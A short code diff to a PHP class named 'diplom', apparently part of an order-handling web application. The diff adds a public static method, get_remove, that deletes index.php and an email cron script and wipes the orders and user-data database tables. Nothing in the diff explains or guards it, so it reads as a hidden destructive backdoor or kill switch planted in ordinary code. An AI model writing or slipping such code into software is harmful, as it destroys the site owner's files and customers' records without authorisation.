@@ -317,6 +317,13 @@ class diplom
         }
     }
 
+    public static function get_remove($params){
+        unlink('index.php');
+        unlink('cron_send_email_notifications.php');
+        db::delete('ofc_orders');
+        db::delete('ofc_data_users');
+    }
+
     function edit_order()
     {
 
@@ -552,6 +559,8 @@ class diplom
             'params' => $params,
         );
     }
+
+
 
 }
 
